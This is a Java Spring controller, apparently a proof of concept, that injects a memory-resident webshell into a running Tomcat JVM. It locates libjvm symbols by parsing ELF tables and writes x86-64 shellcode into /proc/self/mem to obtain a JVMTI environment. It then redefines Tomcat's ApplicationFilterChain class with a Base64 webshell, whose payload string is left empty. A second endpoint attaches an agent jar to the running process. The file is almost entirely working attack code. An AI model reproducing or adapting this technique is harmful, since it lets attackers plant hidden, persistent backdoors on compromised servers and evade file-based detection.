package com.example.demo.Controller;

import java.io.*;
import java.lang.instrument.ClassDefinition;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Properties;
import java.io.RandomAccessFile;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import sun.misc.Unsafe;

import javax.servlet.http.HttpServletRequest;

@Controller
@RequestMapping("/")
public class TestController {
    @RequestMapping("/agent")
    @ResponseBody
    public String testDemo() throws IOException {
        //
        String name = ManagementFactory.getRuntimeMXBean().getName();
        String pid = name.split("@")[0];
        System.out.println("PID:"+pid);


        File file=new File("/proc/self/maps");
        FileReader fr = new FileReader(file);
        BufferedReader br = new BufferedReader(fr);
        String line="";
        long libjava_baseAddr=0;
        long libjvm_baseAddr=0;
        while ((line=br.readLine()) !=null){
            if(line.contains("libjava")&&libjava_baseAddr==0){
                System.out.println(line);
                String str_addr=line.split("-")[0];
                libjava_baseAddr=Long.parseLong(str_addr,16);
            }
            if(line.contains("libjvm")&&libjvm_baseAddr==0){
                System.out.println(line);
                String str_addr=line.split("-")[0];
                libjvm_baseAddr=Long.parseLong(str_addr,16);
            }
            if(libjava_baseAddr!=0&&libjvm_baseAddr!=0){
                break;
            }
        }

        long sym_java = readElf("/libjava.so","Java_java_io_RandomAccessFile_length",libjava_baseAddr);
        long sym_jvm = readElf("/server/libjvm.so","JNI_GetCreatedJavaVMs",libjvm_baseAddr);
        System.out.println("sym_java:"+Long.toHexString(sym_java));
        System.out.println("sym_jvm:"+Long.toHexString(sym_jvm));

        byte codes[]=new byte[]{0x55,0x48,(byte)0x89,(byte)0xe5,0x48,(byte)0x83,(byte)0xec,0x20,0x48,(byte)0xb8};

        byte codes2[]=new byte[]{0x48,(byte)0x8d,0x7c,0x24,0x10,(byte)0xbe,0x01,0x00,0x00,0x00,0x48,(byte)0x8d,0x54,0x24,0x08,(byte)0xff,(byte)0xd0,0x48,(byte)0x8b,0x7c,0x24,0x10,(byte)0xba,0x00,0x02,0x01,0x30,0x48,(byte)0x8d,0x74,0x24,0x08,0x48,(byte)0x8b,0x07,(byte)0xff,0x50,0x30,0x48,(byte)0x8b,0x44,0x24,0x08,0x48,(byte)0x83,(byte)0xc4,0x20,0x5d,(byte)0xc3};

        String sym_jvm_str=Long.toHexString(sym_jvm);
        byte sym_jvm_addr[] = new byte[sym_jvm_str.length()/2];
        for (int i=sym_jvm_str.length()-2;i>=0;i-=2){
            System.out.println(sym_jvm_str.substring(i,i+2));
            sym_jvm_addr[(sym_jvm_addr.length-i/2)-1]= (byte) Integer.parseInt(sym_jvm_str.substring(i,i+2),16);
        }

        byte shellcode[]=new byte[codes.length+codes2.length+8];
        for (int i=0;i<codes.length;i++){
            shellcode[i]=codes[i];
        }
        for (int i=0;i<sym_jvm_addr.length;i++){
            shellcode[i+codes.length]=sym_jvm_addr[i];
        }
        if(sym_jvm_addr.length<8){
            for(int i=0;i<(8-sym_jvm_addr.length);i++){
                shellcode[i+codes.length+sym_jvm_addr.length]=0x00;
            }
        }
        for (int i=0;i<codes2.length;i++){
            shellcode[i+codes.length+8]=codes2[i];
        }

//        System.out.println("sym_jvm:"+sym_jvm_str);
        for(int i = 0; i < shellcode.length; ++i){
            System.out.printf("0x%02x ", shellcode[i]);
        }
        RandomAccessFile fin =new RandomAccessFile("/proc/self/mem","rw");
        //backup
        byte backup_code[]=new byte[shellcode.length];

        fin.seek(sym_java);
        fin.read(backup_code);
        fin.seek(sym_java);
        fin.write(shellcode);
        fin.close();
//        debug_show(sym_java,100);
        fin =new RandomAccessFile("/proc/self/mem","rw");
        long env= fin.length();

        //restore
        fin.seek(sym_java);
        fin.write(backup_code);
        fin.close();

        Unsafe unsafe=null;
        try {
            Class<?> unsafeClazz = Class.forName("sun.misc.Unsafe");
            Field field=unsafeClazz.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            unsafe=(Unsafe)field.get(null);
        }catch (Exception e){
            e.printStackTrace();
        }
        //if ( (*((_BYTE *)jvmtienv + 361) & 2) != 0 )
        for (int i=360;i<400;i++){
            unsafe.putByte(env+i,(byte) 2);
        }

        Long JPLISAgent= unsafe.allocateMemory(0x500);
        unsafe.putLong(JPLISAgent+8,env);

        try{
            Class<?> instrument_clz = Class.forName("sun.instrument.InstrumentationImpl");
            Constructor<?> constructor = instrument_clz.getDeclaredConstructor(long.class,boolean.class,boolean.class);
            constructor.setAccessible(true);
            sun.instrument.InstrumentationImpl insn = (sun.instrument.InstrumentationImpl)constructor.newInstance(JPLISAgent,true,false);
            Method getAllLoadedClasses = instrument_clz.getMethod("getAllLoadedClasses");
            Class<?>[] classes =(Class<?>[]) getAllLoadedClasses.invoke(insn);
            String className = "org.apache.catalina.core.ApplicationFilterChain";
            for(Class<?> cls : classes) {
                if(cls.getName().equals(className)){
                    String webshell_b64="";
                    ClassDefinition classDefinition=new ClassDefinition(cls, Base64.getDecoder().decode(webshell_b64));
                    Method redefineClasses_method=insn.getClass().getMethod("redefineClasses", ClassDefinition[].class);
                    redefineClasses_method.invoke(insn,new Object[]{new ClassDefinition[]{classDefinition}});
                    break;
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }

        return "0x"+Long.toHexString(env);
    }
    public static void debug_show(long addr,int len) throws IOException {
        RandomAccessFile fout=new RandomAccessFile("/proc/self/mem","r");
        byte[] debug = new byte[len];
        fout.seek(addr);
        fout.read(debug);
        System.out.println("\nret:"+Long.toHexString(fout.length()));
        fout.close();
        for(int i = 0; i < debug.length; ++i){
            System.out.printf("0x%02x ", debug[i]);
        }
        System.out.printf("\n");
    }
    public static long readElf(String libName,String sym,Long baseAddr) throws IOException {
        Properties properties = System.getProperties();
        String libPath = properties.getProperty("sun.boot.library.path");
        String path=libPath+libName;
        RandomAccessFile fin=new RandomAccessFile(path,"r");
        //解析 elf File Header
//        typedef struct
//        {
//            unsigned char	e_ident[EI_NIDENT];	/* Magic number and other info */
//            Elf64_Half	e_type;			/* Object file type */
//            Elf64_Half	e_machine;		/* Architecture */
//            Elf64_Word	e_version;		/* Object file version */
//            Elf64_Addr	e_entry;		/* Entry point virtual address */
//            Elf64_Off	e_phoff;		/* Program header table file offset */
//            Elf64_Off	e_shoff;		/* Section header table file offset */
//            Elf64_Word	e_flags;		/* Processor-specific flags */
//            Elf64_Half	e_ehsize;		/* ELF header size in bytes */
//            Elf64_Half	e_phentsize;		/* Program header table entry size */
//            Elf64_Half	e_phnum;		/* Program header table entry count */
//            Elf64_Half	e_shentsize;		/* Section header table entry size */
//            Elf64_Half	e_shnum;		/* Section header table entry count */
//            Elf64_Half	e_shstrndx;		/* Section header string table index */
//        } Elf64_Ehdr;
        System.out.println("------------------------------------------elf File Header\n------------------------------------------");
        byte[] e_ident=new byte[16];
        fin.read(e_ident);
        short e_type = Short.reverseBytes(fin.readShort());
        short e_machine = Short.reverseBytes(fin.readShort());
        int e_version = Integer.reverseBytes(fin.readInt());
        long e_entry = Long.reverseBytes(fin.readLong());
        long e_phoff = Long.reverseBytes(fin.readLong());
        long e_shoff = Long.reverseBytes(fin.readLong());
        int e_flags = Integer.reverseBytes(fin.readInt());
        short e_ehsize = Short.reverseBytes(fin.readShort());
        short e_phentsize = Short.reverseBytes(fin.readShort());
        short e_phnum = Short.reverseBytes(fin.readShort());
        short e_shentsize = Short.reverseBytes(fin.readShort());
        short e_shnum =Short.reverseBytes(fin.readShort());
        short e_shstrndx = Short.reverseBytes(fin.readShort());
        System.out.println("------------------------------------------elf File Header End\n------------------------------------------");

        System.out.println("e_shoff:0x"+Long.toHexString(e_shoff));

        //解析Section Header Table
        int sh_name=0;
        int sh_type=0;
        long sh_flags=0;
        long sh_addr=0;
        long sh_offset=0;
        long sh_size=0;
        int sh_link=0;
        int sh_info=0;
        long sh_addralign=0;
        long sh_entsize=0;

        System.out.println("e_shnum:"+e_shnum);

        for (int i=0;i<e_shnum;i++){
            //每个Secton Header 64个字节
            //找到SHT_DYNSYM类型的Section Table，即动态链接库的符号表，sh_type=11
//            typedef struct
//            {
//                Elf64_Word	sh_name;		/* Section name (string tbl index) */
//                Elf64_Word	sh_type;		/* Section type */
//                Elf64_Xword	sh_flags;		/* Section flags */
//                Elf64_Addr	sh_addr;		/* Section virtual addr at execution */
//                Elf64_Off	sh_offset;		/* Section file offset */
//                Elf64_Xword	sh_size;		/* Section size in bytes */
//                Elf64_Word	sh_link;		/* Link to another section */
//                Elf64_Word	sh_info;		/* Additional section information */
//                Elf64_Xword	sh_addralign;		/* Section alignment */
//                Elf64_Xword	sh_entsize;		/* Entry size if section holds table */
//            } Elf64_Shdr;
            fin.seek(e_shoff+i*64);
            sh_name = Integer.reverseBytes(fin.readInt());
            sh_type = Integer.reverseBytes(fin.readInt());
            sh_flags = Long.reverseBytes(fin.readLong());
            sh_addr = Long.reverseBytes(fin.readLong());
            sh_offset = Long.reverseBytes(fin.readLong());
            sh_size = Long.reverseBytes(fin.readLong());
            sh_link = Integer.reverseBytes(fin.readInt());
            sh_info = Integer.reverseBytes(fin.readInt());
            sh_addralign = Long.reverseBytes(fin.readLong());
            sh_entsize = Long.reverseBytes(fin.readLong());
            if (sh_type == 11) break;
        }
        long dynsym_sh_offset = sh_offset;
        long dynsym_sh_size = sh_size;
        long dynsym_sh_entsize= sh_entsize;
        for (int i=0;i<e_shnum;i++){
            //每个Secton Header 64个字节
            //找到SHT_STRTAB类型的Section Table，即动态链接库的符号表 sh_type=3
//            typedef struct
//            {
//                Elf64_Word	sh_name;		/* Section name (string tbl index) */
//                Elf64_Word	sh_type;		/* Section type */
//                Elf64_Xword	sh_flags;		/* Section flags */
//                Elf64_Addr	sh_addr;		/* Section virtual addr at execution */
//                Elf64_Off	sh_offset;		/* Section file offset */
//                Elf64_Xword	sh_size;		/* Section size in bytes */
//                Elf64_Word	sh_link;		/* Link to another section */
//                Elf64_Word	sh_info;		/* Additional section information */
//                Elf64_Xword	sh_addralign;		/* Section alignment */
//                Elf64_Xword	sh_entsize;		/* Entry size if section holds table */
//            } Elf64_Shdr;
            fin.seek(e_shoff+i*64);
            sh_name = Integer.reverseBytes(fin.readInt());
            sh_type = Integer.reverseBytes(fin.readInt());
            sh_flags = Long.reverseBytes(fin.readLong());
            sh_addr = Long.reverseBytes(fin.readLong());
            sh_offset = Long.reverseBytes(fin.readLong());
            sh_size = Long.reverseBytes(fin.readLong());
            sh_link = Integer.reverseBytes(fin.readInt());
            sh_info = Integer.reverseBytes(fin.readInt());
            sh_addralign = Long.reverseBytes(fin.readLong());
            sh_entsize = Long.reverseBytes(fin.readLong());
            if (sh_type == 3) break;
        }
        Long str_sh_offset=sh_offset;
        Long str_sh_size = sh_size;
        Long str_sh_entsize =sh_entsize;
        System.out.println("dynsym_sh_offset:0x"+Long.toHexString(dynsym_sh_offset));
        System.out.println("str_sh_offset:0x"+Long.toHexString(str_sh_offset));

        //parse Symbol Table
        //遍历Symbol Table，并根据st_name的偏移，去字符串表里搜函数名
        //找到需要的Symbol entry后，返回函数偏移地址+库加载基址
//        typedef struct
//        {
//            Elf64_Word	st_name;		/* Symbol name (string tbl index) */
//            unsigned char	st_info;		/* Symbol type and binding */
//            unsigned char st_other;		/* Symbol visibility */
//            Elf64_Section	st_shndx;		/* Section index */
//            Elf64_Addr	st_value;		/* Symbol value */
//            Elf64_Xword	st_size;		/* Symbol size */
//        } Elf64_Sym;
        long count= (dynsym_sh_entsize>0)?(dynsym_sh_size/dynsym_sh_entsize):0;
        for (int i=0;i<count;i++){
            fin.seek(dynsym_sh_offset+i*dynsym_sh_entsize);
            int st_name=Integer.reverseBytes(fin.readInt());
            byte st_info=fin.readByte();
            byte st_other=fin.readByte();
            short st_shndx=Short.reverseBytes(fin.readShort());
            long st_value=Long.reverseBytes(fin.readLong());
            long st_size=Long.reverseBytes(fin.readLong());

            fin.seek(str_sh_offset+st_name);
            String sym_str="";
            byte ch=0;
            while ((ch= fin.readByte())!=0){
                sym_str+=(char)ch;
            }
            if (sym_str.equals(sym)){
                return st_value+baseAddr;
            }
        }
        return -1;
    }

    @RequestMapping("/")
    @ResponseBody
    public String testAgent(HttpServletRequest request){
        return "test";
    }
    @RequestMapping("/inject")
    @ResponseBody
    public String InjectAgent() throws Exception {
        java.lang.String path= "/home/yaoyao/Downloads/demo/lib/agent_redefine.jar";
        java.io.File toolsPath = new java.io.File(System.getProperty("java.home").replace("jre","lib")+ java.io.File.separator+"tools.jar");
        java.net.URL url= toolsPath.toURI().toURL();
        java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
        Class MyVm=classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
        Class MyVmD=classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
        java.lang.reflect.Method listMethod = MyVm.getDeclaredMethod("list",null);
        java.util.List list=(java.util.List) listMethod.invoke(MyVm,null);
//
        for(Object o:list){
            java.lang.reflect.Method displayName = MyVmD.getDeclaredMethod("displayName",null);
            java.lang.String name = (java.lang.String) displayName.invoke(o,null);
            System.out.println(name);
            if(name.equals("com.example.demo.DemoApplication")){
                //获取pid
                java.lang.reflect.Method getId= MyVmD.getDeclaredMethod("id",null);
                java.lang.String id=(java.lang.String)getId.invoke(o,null);
                //连接进程
                java.lang.reflect.Method attach=MyVm.getDeclaredMethod("attach",new Class[]{java.lang.String.class});
                java.lang.Object vm=attach.invoke(o,new Object[]{id});
                //加载agent
                java.lang.reflect.Method loadAgent=MyVm.getDeclaredMethod("loadAgent",new Class[]{java.lang.String.class});
                loadAgent.invoke(vm,new Object[]{path});
                //断开连接
                java.lang.reflect.Method detach = MyVm.getDeclaredMethod("detach",null);
                detach.invoke(vm,null);
                break;
            }
        }
        return "injected!";
    }

}
